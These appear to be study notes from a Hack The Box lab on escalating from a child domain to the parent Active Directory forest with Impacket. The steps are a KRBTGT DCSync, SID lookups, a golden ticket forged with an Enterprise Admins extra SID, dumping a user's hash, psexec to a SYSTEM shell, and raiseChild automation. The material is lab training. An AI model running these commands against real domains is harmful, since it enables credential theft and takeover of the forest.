We need:
- The KRBTGT hash for the child domain (dcsync with secretsdump)
- The SID for the child domain (lookupsid)
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain 
- The SID of the Enterprise Admins group of the root domain (lookupsid)

Tool: secretsdump.py

**Performing DCSync with secretsdump.py
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

**Performing SID Brute Forcing using lookupsid.py
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "DOMAIN SID"
```

**Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

**Constructing a Golden Ticket using ticketer.py
```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
- Creates ccache file which stores Kerberos credentials 

**Setting the KRB5CCNAME Environment Variable
```
export KRB5CCNAME=hacker.ccache 
```
- Have to point to ccache file

**Get NTLM hash of a domain user
```
secretsdump.py logistics.inlanefreight.local/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 -just-dc-user INLANEFREIGHT/bross
```

**Getting a SYSTEM shell using Impacket's psexec.py
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

**Performing the Attack with raiseChild.py
```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
